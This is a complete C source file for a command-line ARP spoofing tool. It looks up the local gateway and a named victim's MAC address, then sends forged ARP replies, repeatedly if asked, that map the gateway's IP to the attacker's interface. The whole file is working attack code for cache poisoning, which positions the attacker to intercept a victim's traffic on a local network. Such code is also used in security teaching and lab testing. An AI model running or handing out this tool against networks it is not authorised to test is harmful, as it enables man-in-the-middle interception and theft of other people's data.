#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <ifaddrs.h>
#include <getopt.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netpacket/packet.h>
#include <netinet/if_ether.h>

char *if_name = NULL;

void print_mac(const char *msg, uint8_t *addr)
{
	printf("%s:\t%02x:%02x:%02x:%02x:%02x:%02x\n",
			msg,
			(unsigned char) addr[0],
			(unsigned char) addr[1],
			(unsigned char) addr[2],
			(unsigned char) addr[3],
			(unsigned char) addr[4],
			(unsigned char) addr[5]);
}

void die(const char *error)
{
	fprintf(stderr, "Error: %s\n", error);
	free(if_name);
	exit(EXIT_FAILURE);
}

char *get_interface(void)
{
	struct ifaddrs *ifaddr, *ifa;
	char *ret = NULL;
	if (getifaddrs(&ifaddr) == -1) {
		die(strerror(errno));
	}

	/* get first listed operational interface */
	for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
		unsigned int flags = ifa->ifa_flags;
		if ((flags & IFF_UP) && (flags & IFF_RUNNING) && !(flags & IFF_LOOPBACK)) {
			ret = strdup(ifa->ifa_name);
			break;
		}
	}

	freeifaddrs(ifaddr);
	return ret;
}

uint32_t get_gateway(void)
{
	uint32_t ret;
	char buf[1024];
	const char seps[] = " \t";
	FILE *f = fopen("/proc/net/route", "r");

	/* believe it or not, this is the best way to do it */
	do {
		fgets(buf, 1024, f);
	} while (strncmp(if_name, buf, strlen(if_name)));

	char *p = strtok(buf, seps);
	p = strtok(NULL, seps);
	p = strtok(NULL, seps);
	p[8] = '\0';

	ret = strtol(p, NULL, 16);

	fclose(f);
	return ret;
}

void request_mac(int fd, struct ether_arp *req, uint32_t ip_addr)
{
	struct ifreq ifr;
	size_t if_name_len = strlen(if_name);
	if (if_name_len < sizeof(ifr.ifr_name)) {
		memcpy(ifr.ifr_name, if_name, if_name_len);
		ifr.ifr_name[if_name_len] = 0;
	} else {
		die("Interface name is too long");
	}

	/* this gets the number of the network interface */
	if (ioctl(fd, SIOCGIFINDEX, &ifr) == -1) {
		die(strerror(errno));
	}
	int ifindex = ifr.ifr_ifindex;

	/* will be sent to everyone */
	const unsigned char ether_broadcast_addr[] =
	{ 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };

	/* special socket address type used for AF_PACKET */
	struct sockaddr_ll addr = {0};
	addr.sll_family   = AF_PACKET;
	addr.sll_ifindex  = ifindex;
	addr.sll_halen    = ETHER_ADDR_LEN;
	addr.sll_protocol = htons(ETH_P_ARP);
	memcpy(addr.sll_addr, ether_broadcast_addr, ETHER_ADDR_LEN);

	/* construct the ARP request */
	req->arp_hrd = htons(ARPHRD_ETHER);
	req->arp_pro = htons(ETH_P_IP);
	req->arp_hln = ETHER_ADDR_LEN;
	req->arp_pln = sizeof(in_addr_t);
	req->arp_op  = htons(ARPOP_REQUEST);
	/* zero because that's what we're asking for */
	memset(&req->arp_tha, 0, sizeof(req->arp_tha));

	memcpy(&req->arp_tpa, &ip_addr, sizeof(req->arp_tpa));

	/* now to get our hardware address */
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
		die(strerror(errno));
	}
	if (ifr.ifr_hwaddr.sa_family != ARPHRD_ETHER) {
		die("Not an ethernet interface");
	}
	memcpy(&req->arp_sha, (unsigned char *) ifr.ifr_hwaddr.sa_data, sizeof(req->arp_sha));

	/* ...and our network address */
	if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
		die(strerror(errno));
	}
	memcpy(&req->arp_spa, (unsigned char *) ifr.ifr_addr.sa_data + 2, sizeof(req->arp_spa));

	/* actually send it */
	if (sendto(fd, req, sizeof(struct ether_arp), 0, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
		die(strerror(errno));
	}

	while (1) {
		/* can't use recvfrom() -- no network layer */
		int len = recv(fd, req, sizeof(struct ether_arp), 0);
		if (len == -1) {
			die(strerror(errno));
		}
		if (len == 0) {   /* no response */
			continue;
		}
		
		unsigned int from_addr = (req->arp_spa[3] << 24)
		                       + (req->arp_spa[2] << 16)
		                       + (req->arp_spa[1] << 8)
		                       + (req->arp_spa[0] << 0);
		if (from_addr != ip_addr) {
			continue;
		}

		/* everything's good, we have our response */
		break;
	}
}

void arp_spoof(int fd, const unsigned char *victim_mac, uint32_t victim_ip, uint32_t spoof_ip)
{
	struct ether_arp resp;
	struct ifreq ifr;
	size_t if_name_len = strlen(if_name);
	if (if_name_len < sizeof(ifr.ifr_name)) {
		memcpy(ifr.ifr_name, if_name, if_name_len);
		ifr.ifr_name[if_name_len] = 0;
	} else {
		die("Interface name is too long");
	}

	if (ioctl(fd, SIOCGIFINDEX, &ifr) == -1) {
		die(strerror(errno));
	}
	int ifindex = ifr.ifr_ifindex;

	struct sockaddr_ll addr = {0};
	addr.sll_family   = AF_PACKET;
	addr.sll_ifindex  = ifindex;
	addr.sll_halen    = ETHER_ADDR_LEN;
	addr.sll_protocol = htons(ETH_P_ARP);
	memcpy(addr.sll_addr, victim_mac, ETHER_ADDR_LEN);

	resp.arp_hrd = htons(ARPHRD_ETHER);
	resp.arp_pro = htons(ETH_P_IP);
	resp.arp_hln = ETHER_ADDR_LEN;
	resp.arp_pln = sizeof(in_addr_t);
	resp.arp_op  = htons(ARPOP_REPLY);

	if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
		die(strerror(errno));
	}
	if (ifr.ifr_hwaddr.sa_family != ARPHRD_ETHER) {
		die("Not an ethernet interface");
	}
	memcpy(&resp.arp_sha, (unsigned char *) ifr.ifr_hwaddr.sa_data, sizeof(resp.arp_sha));
	memcpy(&resp.arp_spa, &spoof_ip, sizeof(resp.arp_spa));
	memcpy(&resp.arp_tha, victim_mac, sizeof(resp.arp_tha));
	memcpy(&resp.arp_tpa, &victim_ip, sizeof(resp.arp_tpa));

	if (sendto(fd, &resp, sizeof(resp), 0, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
		die(strerror(errno));
	}
}

int main(int argc, char *argv[])
{
	struct ether_arp req;
	char *victim_ip_str = NULL;
	uint32_t spoof_ip = 0;
	int repeat = 0;
	int verbose = 0;
	int spoof_gateway = 0;

	/* parsing code here */
	int c;
	while (1) {
		static struct option long_options[] = {
			{ "interface", required_argument, NULL, 'i' },
			{ "repeat",    required_argument, NULL, 'r' },
			{ "spoof-ip",  required_argument, NULL, 's' },
			{ "verbose",   no_argument,       NULL, 'v' },
			{ 0,           0,                 0,     0  }
		};

		int option_index = 0;
		struct in_addr spoof_ip_addr = {0};

		c = getopt_long(argc, argv, "i:r:s:v", long_options, &option_index);

		if (c == -1) {
			break;
		}

		switch (c) {
			case 'i':
				if_name = strdup(optarg);
				break;
			case 'r':
				repeat = strtoul(optarg, NULL, 10);
				break;
			case 's':
				if (!inet_aton(optarg, &spoof_ip_addr)) {
					die("IP to spoof is invalid");
				}
				spoof_ip = spoof_ip_addr.s_addr;
				break;
			case 'v':
				verbose = 1;
				break;
			case '?':
				break;
			default:
				die("Invalid option");
				break;
		}
	}

	if (argc > optind + 1) {
		die("Too many arguments");
	} else if (argc == optind) {
		die("Please provide a victim IP");
	} else {
		victim_ip_str = argv[optind];
	}

	struct in_addr victim_ip_addr = {0};
	if (!inet_aton(victim_ip_str, &victim_ip_addr)) {
		die("Invalid IP address");
	}
	uint32_t victim_ip = victim_ip_addr.s_addr;

	if (!if_name) {
		if_name = get_interface();
	}
	/* get_interface() didn't find anything */
	if (!if_name) {
		die("No valid interface found");
	}
	if (verbose) {
		printf("Interface:\t\t%s\n", if_name);
	}
	if (!spoof_ip) {
		spoof_ip = get_gateway();
		spoof_gateway = 1;
	}

	/* get an ARP socket */
	int fd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	if (fd == -1) {
		die(strerror(errno));
	}

	if (spoof_gateway) {
		request_mac(fd, &req, spoof_ip);
		if (verbose) {
			print_mac("Gateway MAC address", req.arp_sha);
		}
	}

	request_mac(fd, &req, victim_ip);
	if (verbose) {
		print_mac("Victim MAC address", req.arp_sha);
	}

	do {
		arp_spoof(fd, req.arp_sha, victim_ip, spoof_ip);
		sleep(repeat);
	} while (repeat);

	free(if_name);
	return EXIT_SUCCESS;
}
